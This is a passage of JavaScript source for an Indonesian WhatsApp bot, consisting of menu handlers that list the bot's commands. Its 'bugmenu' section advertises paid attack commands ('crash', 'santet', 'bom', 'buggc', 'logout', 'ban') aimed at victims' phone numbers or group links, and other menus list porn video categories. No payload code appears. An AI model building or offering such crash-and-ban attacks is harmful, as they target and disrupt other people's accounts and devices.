├*${runtime(process.uptime())}*
╰────────────♡ۣۜۜ፝͜͜͡͡✿

╭──♡ۣۜۜ፝͜͜͡͡✿「 𝙄𝙉𝘿𝙊𝙉𝙀𝗦𝙄𝘼 」♡ۣۜۜ፝͜͜͡͡✿
├ *Hari Ini* :*${hariini}*
├ *Wib* : ${barat} WIB
├ *Wita* : ${tengah} WITA
├ *Wit* : ${timur} WIT
╰─────────────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [
  { buttonId: 'allmenu', buttonText: { displayText: '⚡ALL MENU' }, type: 1, horizontalAlignment: "RIGHT" },
  { buttonId: 'simplemenu', buttonText: { displayText: '🔥SIMPLE MENU' }, type: 1, horizontalAlignment: "LEFT" },
  { buttonId: 'store', buttonText: { displayText: '🛒STORE' }, type: 1, horizontalAlignment: "CENTER" }
]
dica.sendMessage(m.chat, { caption: `${anu}`, location: { jpegThumbnail: await reSize(buffer, 200, 200) }, buttons: buttons, footer: nyoutube, mentions: [m.sender] })
}
break;
/**𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭 𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇**/
case 'allmenu': {
            	dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/spam.mp3`)
            let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let ments = [ownernya, me, ini_mark]
                anu = `_*Hi Kak ${m.pushName} 👋.*_
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
        [^𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡^]
▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
╭┈─────────────⩵꙰➵
⎙ : *Name Own* : 𝑫𝑰𝑪𝑨♛
⎙ : *Name bot* : [❤️𝒌𝒊𝒍𝒂𝒂𝒂 ⩵꙰
⎙ : *Your Name* : _${m.pushName}_
⎙ : *Date Server* :  _${moment.tz('Asia/Jakarta').format('DD/MM/YY')}_
⎙ : *Time Sever* : _${moment.tz('Asia/Jakarta').format('HH:mm:ss')}_
╰───➤ 
╭▱▰▱▰▱〘 𝙊𝙏𝙃𝙀𝙍 〙▱▰▱▰▱
┃➳ : Runtime ( *${runtime(process.uptime())}* )
┃➳ : Sewa (Harga Seiklasnya)
┃➳ : Join (Untuk Masuk Grup)
┃➳ : Owner (Untuk Konsultasi)
┃➳ : Bugm (UserPremium)
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•━•⩵࿐

╭━━•›〘 𝗚𝙧𝙤𝙪𝙥 𝙈𝙚𝙣𝙪 〙
│➵ :  ${prefix}linkgroup
│➵ :  ${prefix}ephemeral [option]
│➵ :  ${prefix}setname [text]
│➵ :  ${prefix}setdesc [text]
│➵ :  ${prefix}group [option]
│➵ :  ${prefix}editinfo [option]
│➵ :  ${prefix}kick @user
│➵ :  ${prefix}hidetag [text]
│➵ :  ${prefix}tagall [text]
│➵ :  ${prefix}antilink [on/off]
│➵ :  ${prefix}antivirtext [on/off]
│➵ :  ${prefix}autovn [on/off]
│➵ :  ${prefix}autojoin [on/off]
│➵ :  ${prefix}mute [on/off]
│➵ :  ${prefix}promote @user
│➵ :  ${prefix}demote @user
│➵ :  ${prefix}vote [text]
│➵ :  ${prefix}devote
│➵ :  ${prefix}upvote
│➵ :  ${prefix}cekvote
│➵ :  ${prefix}hapusvote
│
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]
╭━━•›〘 𝗥𝗮𝗻𝗱𝗼𝗺 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 〙
│➵ :  ${prefix}doge
│➵ :  ${prefix}patrick
│➵ :  ${prefix}lonet
│➵ :  ${prefix}lidi
│➵ :  ${prefix}kucing
│➵ :  ${prefix}sponbob
│➵ :  ${prefix}kawansponbob
│➵ :  ${prefix}popoci
│➵ :  ${prefix}meow
│➵ :  ${prefix}menjamet
│➵ :  ${prefix}gojosatoru
│➵ :  ${prefix}hopeboy
│➵ :  ${prefix}dinokuning
│➵ :  ${prefix}krrobot
│➵ :  ${prefix}nicholas
│➵ :  ${prefix}jiisho
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]
╭━━•›〘 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂 〙
│
│➵ :  ${prefix}owner
│➵ :  ${prefix}report
│➵ :  ${prefix}menu / ${prefix}help
│➵ :  ${prefix}delete
│➵ :  ${prefix}quoted
│➵ :  ${prefix}listfoto
│➵ :  ${prefix}listvideo
│➵ :  ${prefix}listpc
│➵ :  ${prefix}listgc
│➵ :  ${prefix}listonline
│➵ :  ${prefix}menfes 
│➵ :  ${prefix}tinyurl [url]
│➵ :  ${prefix}shrturl [url]
│
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗔𝗻𝗼𝗻𝘆𝗺𝗼𝘂𝘀 𝗠𝗲𝗻𝘂 〙
│➵ :  ${prefix}anonymous
│➵ :  ${prefix}start
│➵ :  ${prefix}next
│➵ :  ${prefix}keluar
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗙𝘂𝗻 𝗠𝗲𝗻𝘂 〙
│➵ :  ${prefix}halah
│➵ :  ${prefix}hilih
│➵ :  ${prefix}huluh
│➵ :  ${prefix}heleh
│➵ :  ${prefix}holoh
│➵ :  ${prefix}jadian
│➵ :  ${prefix}jodohku
│➵ :  ${prefix}delttt
│➵ :  ${prefix}tictactoe
│➵ :  ${prefix}family100
│➵ :  ${prefix}tebak [option]
│➵ :  ${prefix}math [mode]
│➵ :  ${prefix}suitpvp [@tag]
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗥𝗮𝗻𝗱𝗼𝗺 𝗠𝗲𝗻𝘂 〙
│➵ :  ${prefix}gbtku
│➵ :  ${prefix}coffe
│➵ :  ${prefix}quotesanime
│➵ :  ${prefix}couple
│➵ :  ${prefix}waifu
│➵ :  ${prefix}cecanvietnam
│➵ :  ${prefix}cecanmalaysia
│➵ :  ${prefix}cecanindonesia
│➵ :  ${prefix}cecankorea
│➵ :  ${prefix}cecanjapan
│➵ :  ${prefix}cecanthailand
│➵ :  ${prefix}cecanchina
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗖𝗼𝗻𝘃𝗲𝗿𝘁 𝗠𝗲𝗻𝘂 〙
│➵ :  ${prefix}toimage
│➵ :  ${prefix}removebg
│➵ :  ${prefix}sticker
│➵ :  ${prefix}emojimix
│➵ :  ${prefix}emojimix2
│➵ :  ${prefix}tovideo
│➵ :  ${prefix}togif
│➵ :  ${prefix}tourl
│➵ :  ${prefix}tovn
│➵ :  ${prefix}tomp3
│➵ :  ${prefix}toaudio
│➵ :  ${prefix}ebinary
│➵ :  ${prefix}dbinary
│➵ :  ${prefix}styletext
│➵ :  ${prefix}smeme
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗩𝗜𝗗𝗘𝗢 𝗔𝘀𝘂𝗽𝗮𝗻 〙
│➵ :  ${prefix}bokep
│➵ :  ${prefix}asupan
│➵ :  ${prefix}ghea
│➵ :  ${prefix}ukhty
│➵ :  ${prefix}notnot
│➵ :  ${prefix}rika
│➵ :  ${prefix}kayes
│➵ :  ${prefix}santuy
│➵ :  ${prefix}bocil
│➵ :  ${prefix}colmek
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗦𝗧𝗢𝗥𝗘 〙
│➵ :  ${prefix}proses
│➵ :  ${prefix}done
│➵ :  ${prefix}store
│➵ :  ${prefix}masukandata
│➵ :  ${prefix}payment
│➵ :  ${prefix}dmff
│➵ :  ${prefix}dmml
│➵ :  ${prefix}ucpubg
│➵ :  ${prefix}cod
│➵ :  ${prefix}sausageman
│➵ :  ${prefix}jasher
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 〙
│➵ :  ${prefix}sendsesi
│➵ :  ${prefix}react [emoji]
│➵ :  ${prefix}chat [option]
│➵ :  ${prefix}join [link]
│➵ :  ${prefix}leave
│➵ :  ${prefix}ban [nomor]
│➵ :  ${prefix}unban [nomor]
│➵ :  ${prefix}block @user
│➵ :  ${prefix}unblock @user
│➵ :  ${prefix}bcgroup [text]
│➵ :  ${prefix}bcall [text]
│➵ :  ${prefix}setppbot [image]
│➵ :  ${prefix}setexif
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]`
let buttons = [{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 }]
            dica.sendMessage(m.chat, { caption: `${anu}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: buttons, footer: nyoutube, mentions: ments})
            await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })  
            }
            break
            case 'bugmenu': {
dica_dev = await getBuffer(`https://cahyacc.github.io/media/audio/bugm.mp3`)
let ownernya = ownernomer + '@s.whatsapp.net'
            let me = m.sender
            let kilaa = `ɪɴɪ ᴍᴇɴᴜ ᴋᴜꜱᴜꜱ ᴩʀᴇᴍɪᴜᴍ Yᴀ ᴋɪᴅꜱ
▬▭▬▭▬▭▬▭▬▬▭▬▭▬
^𝗕𝗨𝗚 𝗕𝗢𝗧 𝗩𝗜𝗣 𝗕𝗬 𝗞𝗶𝗹𝗮𝗮𝗮 ^
╭┈─────────────⩵꙰➵
⎙ : *Name Own* : 𝑫𝑰𝑪𝑨♛
⎙ : *Name bot* : [❤️𝒌??𝒍𝒂𝒂𝒂 ⩵꙰
╰───➤ 
╭▱▰▱▰▱〘 𝙊𝙏𝙃𝙀𝙍 〙▱▰▱▰▱
┃➳ : Sewa
┃➳ : Runtime ( Untuk Cek Status )
┃➳ : Listjualan
┃➳ : Restart
┃➳ : addakses @
┃➳ : delakses @
┃➳ : kick @
╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•━•⩵࿐
╭━━•›〘 𝘽𝙐𝙂 𝙀𝙈𝙊𝙅𝙄 〙
│➵ : 🌷〘 contoh 62xxx.ꫂ 〙 
│➵ : 🔥〘 contoh 62xxx.ꫂ 〙 
│➵ : 🗿〘 contoh 62xxx.ꫂ 〙 
│➵ : 🎁〘 contoh 62xxx.ꫂ 〙 
│➵ : 🎭〘 contoh 62xxx.ꫂ 〙 
│➵ : 👑〘 contoh 62xxx.ꫂ 〙 
│➵ : ⚔️〘 contoh 62xxx.ꫂ 〙 
│➵ : ⚡〘 contoh 62xxx.ꫂ 〙 
│➵ : 🔨〘 contoh 62xxx.ꫂ 〙 
│➵ : 🔱〘 contoh 62xxx.ꫂ 〙 
│➵ : 🇮🇩〘 contoh 62xxx.ꫂ 〙 
│➵ : ⛓️〘 contoh 62xxx.ꫂ 〙 
│➵ : 🛠️〘 contoh 62xxx.ꫂ 〙 
│➵ : 🛡️〘 contoh 62xxx.ꫂ 〙 
│➵ : 💣〘 contoh 62xxx.ꫂ 〙 
│➵ : 🚬〘 contoh 62xxx.ꫂ 〙 
│➵ : 😴〘 contoh 62xxx.ꫂ 〙 
│➵ : 🤗〘 contoh 62xxx.ꫂ 〙 
│➵ : 🤥〘 contoh 62xxx.ꫂ 〙 
│➵ : 🤓〘 contoh 62xxx.ꫂ 〙 
│➵ : 🌚〘 contoh 62xxx.ꫂ 〙 
│➵ : ❤️❤️〘 contoh 62xxx.ꫂ 〙 
│➵ : 🔱🛠️〘 contoh 62xxx.ꫂ 〙 
│➵ : ⚔️⚡〘 contoh 62xxx.ꫂ 〙 
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝘽𝙐𝙂 𝙑𝙀𝙍𝙄𝙁 〙
│➵ : ban〘 contoh 62xxx.ꫂ 〙 
│➵ : verif〘 contoh 62xxx.ꫂ 〙 
│➵ : logout 〘 contoh 62xxx.ꫂ 〙 
│➵ : kenon 〘 contoh 62xxx.ꫂ 〙 
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝘽𝙐𝙂 𝘼𝙏𝙏𝘼𝘾𝙆 〙
│➵ :  santet〘 contoh 62xxx.ꫂ 〙 
│➵ :  santet2〘 contoh 62xxx.ꫂ 〙 
│➵ :  troli〘 contoh 62xxx.ꫂ 〙 
│➵ :  troli2〘 contoh 62xxx.ꫂ 〙 
│➵ :  bom〘 contoh 62xxx.ꫂ 〙 
│➵ :  trava〘 contoh 62xxx.ꫂ 〙 
│➵ :  crash〘 contoh 62xxx.ꫂ 〙 
│➵ :  hard〘 contoh 62xxx.ꫂ 〙 
│➵ :  brutal〘 contoh 62xxx.ꫂ 〙 
│➵ :  bully〘 contoh 62xxx.ꫂ 〙 
│➵ :  gasto〘 contoh 62xxx.ꫂ 〙 
│➵ :  attack〘 contoh 62xxx.ꫂ 〙 
│➵ :  galau〘 contoh 62xxx.ꫂ 〙 
│➵ :  sendto〘 contoh 62xxx.ꫂ 〙 
│➵ :  perkosa〘 contoh 62xxx.ꫂ 〙 
│➵ :  awokawok〘 contoh 62xxx.ꫂ 〙 
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]

╭━━•›〘 𝘽𝙐𝙂 𝙂𝘾 〙
│➵ :  buggc〘 Link Group.ꫂ 〙
│➵ :  otwgc〘 Link Group.ꫂ 〙
│➵ :  wargc〘 Link Group.ꫂ 〙
│➵ :  santetgc〘 Link Group.ꫂ 〙
│➵ :  peranggc〘 Link Group.ꫂ 〙
╰━ ━ ━ ━ ━•━•⩵[ ⽂ - 𝒌𝒊𝒍𝒂𝒂𝒂㕚]`

let buttons = [
{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1, horizontalAlignment: "LEFT" },
{ buttonId: 'listsewa', buttonText: { displayText: '❗Sewa' }, type: 1, horizontalAlignment: "RIGHT" }
]
dica.sendButtonText(m.chat, buttons, kilaa, nyoutube);
await new Promise(resolve => setTimeout(resolve, 3000));
await dica.sendMessage(m.chat, { audio: dica_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })  
}
 break 
 case 'mgroup': {
goup = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Group Menu* 」
│➵  ${prefix}linkgroup
│➵  ${prefix}ephemeral [option]
│➵  ${prefix}setppgc [image]
│➵  ${prefix}setname [text]
│➵  ${prefix}setdesc [text]
│➵  ${prefix}group [option]
│➵  ${prefix}editinfo [option]
│➵  ${prefix}add @user
│➵  ${prefix}kick @user
│➵  ${prefix}hidetag [text]
│➵  ${prefix}tagall [text]
│➵  ${prefix}antilink [on/off]
│➵  ${prefix}mute [on/off]
│➵  ${prefix}promote @user
│➵  ${prefix}demote @user
│➵  ${prefix}vote [text]
│➵  ${prefix}devote
│➵  ${prefix}upvote
│➵  ${prefix}cekvote
│➵  ${prefix}hapusvote
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, goup, nyoutube, m, {quoted: fkontak})
            }
            break

case 'mmain': {
min = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Main Menu*
│
│➵ ${prefix}ping
│➵ ${prefix}owner
│➵ ${prefix}report
│➵ ${prefix}menu / ${prefix}help
│➵ ${prefix}delete
│➵ ${prefix}infochat
│➵ ${prefix}quoted
│➵ ${prefix}listvideo
│➵ ${prefix}listfoto
│➵ ${prefix}listpc
│➵ ${prefix}listgc
│➵ ${prefix}listonline
│➵ ${prefix}speedtest
│➵ ${prefix}menfes
│➵ ${prefix}tinyurl [link]
│➵ ${prefix}shrturl [link]
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, min, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mfun': {
mun = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Fun Menu*
│
│➵ ${prefix}simih
│➵ ${prefix}halah
│➵ ${prefix}hilih
│➵ ${prefix}huluh
│➵ ${prefix}heleh
│➵ ${prefix}holoh
│➵ ${prefix}jadian
│➵ ${prefix}jodohku
│➵ ${prefix}apakah
│➵ ${prefix}bisakah
│➵ ${prefix}kapan
│➵ ${prefix}delttt
│➵ ${prefix}tictactoe
│➵ ${prefix}family100
│➵ ${prefix}tebak [option]
│➵ ${prefix}math [mode]
│➵ ${prefix}suitpvp [@tag]
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, mun, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mconvert': {
cnvert = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Convert Menu*
│
│➵ ${prefix}toimage
│➵ ${prefix}removebg
│➵ ${prefix}sticker
│➵ ${prefix}emojimix
│➵ ${prefix}emojimix2
│➵ ${prefix}tovideo
│➵ ${prefix}togif
│➵ ${prefix}tourl
│➵ ${prefix}tovn
│➵ ${prefix}tomp3
│➵ ${prefix}toaudio
│➵ ${prefix}ebinary
│➵ ${prefix}dbinary
│➵ ${prefix}styletext
│➵ ${prefix}smeme
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, cnvert, nyoutube, m, {quoted: fkontak})
            }
            break

case 'mdatabase': {
dtbase = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Database Menu*
│
│➵ ${prefix}setcmd
│➵ ${prefix}listcmd
│➵ ${prefix}delcmd
│➵ ${prefix}lockcmd
│➵ ${prefix}addmsg
│➵ ${prefix}listmsg
│➵ ${prefix}getmsg
│➵ ${prefix}delmsg
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, dtbase, nyoutube, m, {quoted: fkontak})
            }
            break
case 'manonymous': {
aonymous = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Anonymous Menu*
│
│➵ ${prefix}anonymous
│➵ ${prefix}start
│➵ ${prefix}next
│➵ ${prefix}keluar
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, aonymous, nyoutube, m, {quoted: fkontak})
            }
            break
            

            case 'mowner': {
oner = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Owner Menu*
│
│➵ ${prefix}sendsesi
│➵ ${prefix}react [emoji]
│➵ ${prefix}chat [option]
│➵ ${prefix}join [link]
│➵ ${prefix}leave
│➵ ${prefix}ban [nomor]
│➵ ${prefix}unban [nomor]
│➵ ${prefix}block @user
│➵ ${prefix}unblock @user
│➵ ${prefix}bcgroup [text]
│➵ ${prefix}bcall [text]
│➵ ${prefix}setppbot [image]
│➵ ${prefix}setexif
│➵ ${prefix}setmenu [option]
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, oner, nyoutube, m, {quoted: m})
            }
            break
case 'mprimbon': {
pimbon = `╭──♡ۣۜۜ፝͜͜͡͡✿ *Primbon Menu*
│
│➵ ${prefix}nomorhoki
│➵ ${prefix}artimimpi
│➵ ${prefix}artinama
│➵ ${prefix}ramaljodoh
│➵ ${prefix}ramaljodohbali
│➵ ${prefix}suamiistri
│➵ ${prefix}ramalcinta
│➵ ${prefix}cocoknama
│➵ ${prefix}pasangan
│➵ ${prefix}jadiannikah
│➵ ${prefix}sifatusaha
│➵ ${prefix}rezeki
│➵ ${prefix}pekerjaan
│➵ ${prefix}nasib
│➵ ${prefix}penyakit
│➵ ${prefix}tarot
│➵ ${prefix}fengshui
│➵ ${prefix}haribaik
│➵ ${prefix}harisangar
│➵ ${prefix}harisial
│➵ ${prefix}nagahari
│➵ ${prefix}arahrezeki
│➵ ${prefix}peruntungan
│➵ ${prefix}weton
│➵ ${prefix}karakter
│➵ ${prefix}keberuntungan
│➵ ${prefix}memancing
│➵ ${prefix}masasubur
│➵ ${prefix}zodiak
│
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, pimbon, nyoutube, m, {quoted: fkontak})
            }
            break
case 'imagemaker': {
pimbon = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Image Maker* 」
│➵  ${prefix}wanted
│➵  ${prefix}trigger
│➵  ${prefix}resize
│➵  ${prefix}rainbow
│➵  ${prefix}pixelate
│➵  ${prefix}darkness
│➵  ${prefix}blur
│➵  ${prefix}beautiful
│➵  ${prefix}circle
│➵  ${prefix}invert
│➵  ${prefix}facepalm
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, pimbon, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mtextpro': {
txtpro = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Text Pro Menu* 」
│➵  ${prefix}blackpink
│➵  ${prefix}glitch
│➵  ${prefix}berry
│➵  ${prefix}pencil
│➵  ${prefix}3dboxtext
│➵  ${prefix}neon
│➵  ${prefix}logobear
│➵  ${prefix}thunder
│➵  ${prefix}3dchristmas
│➵  ${prefix}strawberry
│➵  ${prefix}magma
│➵  ${prefix}pornhub
│➵  ${prefix}candy
│➵  ${prefix}christmas
│➵  ${prefix}sparklechristmas
│➵  ${prefix}holographic
│➵  ${prefix}deepsea
│➵  ${prefix}scifi
│➵  ${prefix}rainbow
│➵  ${prefix}waterpipe
│➵  ${prefix}spooky
│➵  ${prefix}karbon
│➵  ${prefix}colorneon
│➵  ${prefix}circuit
│➵  ${prefix}discovery
│➵  ${prefix}metalic
│➵  ${prefix}fiction
│➵  ${prefix}demon
│➵  ${prefix}3dbox
│➵  ${prefix}transformer 
│➵  ${prefix}3dstone 
│➵  ${prefix}greenneon 
│➵  ${prefix}neonlight 
│➵  ${prefix}harrypotter 
│➵  ${prefix}brokenglass 
│➵  ${prefix}papercut 
│➵  ${prefix}lion2 
│➵  ${prefix}watercolor
│➵  ${prefix}multicolor 
│➵  ${prefix}neondevil
│➵  ${prefix}underwater
│➵  ${prefix}graffitibike
│➵  ${prefix}3davengers
│➵  ${prefix}snow
│➵  ${prefix}cloud
│➵  ${prefix}honey
│➵  ${prefix}ice
│➵  ${prefix}fruitjuice
│➵  ${prefix}biscuit
│➵  ${prefix}wood
│➵  ${prefix}whitebear 
│➵  ${prefix}chocolate 
│➵  ${prefix}matrix
│➵  ${prefix}blood
│➵  ${prefix}dropwater
│➵  ${prefix}toxic
│➵  ${prefix}lava
│➵  ${prefix}rock
│➵  ${prefix}bloodglas
│➵  ${prefix}hallowen
│➵  ${prefix}darkgold
│➵  ${prefix}joker 
│➵  ${prefix}wicker
│➵  ${prefix}firework
│➵  ${prefix}skeleton
│➵  ${prefix}sand
│➵  ${prefix}glue
│➵  ${prefix}1917
│➵  ${prefix}leaves
│➵  ${prefix}glitch2 
│➵  ${prefix}harrypot
│➵  ${prefix}graffiti
│➵  ${prefix}glitch3
│➵  ${prefix}3dspace
│➵  ${prefix}lion
│➵  ${prefix}wolf 
│➵  ${prefix}retro
│➵  ${prefix}8bit 
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, txtpro, nyoutube, m, {quoted: fkontak})
            }
            break
case 'hostingmenu': {
mhosu = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Hosting Menu* 」
│➵  ${prefix}createcp
│➵  ${prefix}listcp
│➵  ${prefix}terminate
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: `simplemenu`, buttonText: {displayText: 'BACK'}, type: 1},{buttonId: `donasi`, buttonText: {displayText: 'DONASI'}, type: 1}]
            await dica.sendButtonText(m.chat, buttons, mhosu, nyoutube, m)
            }
            break

case 'mrandom': {
rndom = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Random Menu* 」
│➵  ${prefix}coffe
│➵  ${prefix}quotesanime
│➵  ${prefix}motivasi
│➵  ${prefix}quotes
│➵  ${prefix}quotesjawa
│➵  ${prefix}katagalau
│➵  ${prefix}dilan
│➵  ${prefix}katabucin
│➵  ${prefix}bucin
│➵  ${prefix}katailham
│➵  ${prefix}renungan
│➵  ${prefix}gombalan
│➵  ${prefix}couple
│➵  ${prefix}anime
│➵  ${prefix}waifu
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, rndom, nyoutube, m, {quoted: fkontak})
            }
            break
case 'msearch': {
sarch = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Search Menu* 」
│➵  ${prefix}play [query]
│➵  ${prefix}yts [query]
│➵  ${prefix}google [query]
│➵  ${prefix}gimage [query]
│➵  ${prefix}pinterest [query]
│➵  ${prefix}wallpaper [query]
│➵  ${prefix}wikimedia [query]
│➵  ${prefix}ringtone [query]
│➵  ${prefix}ssweb [ link ]
│➵  ${prefix}brainly
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, search, nyoutube, m, {quoted: fkontak})
            }
            break
case 'mdownload': {
dwnloader = `╭──♡ۣۜۜ፝͜͜͡͡✿「 *Downloader Menu* 」
│➵  ${prefix}tiktok [url]
│➵  ${prefix}tiktokaudio [url]
│➵  ${prefix}wikimedia [url]
│➵  ${prefix}pinterest
│➵  ${prefix}umma [url]
│➵  ${prefix}ytmp3 [url]
│➵  ${prefix}ytmp4 [url]
│➵  ${prefix}gitclone [url]
│➵  ${prefix}umma [url]
╰────♡ۣۜۜ፝͜͜͡͡✿`
let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back' }, type: 1 },{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
            await dica.sendButtonText(m.chat, buttons, dwnloader, nyoutube, m, {quoted: fkontak})
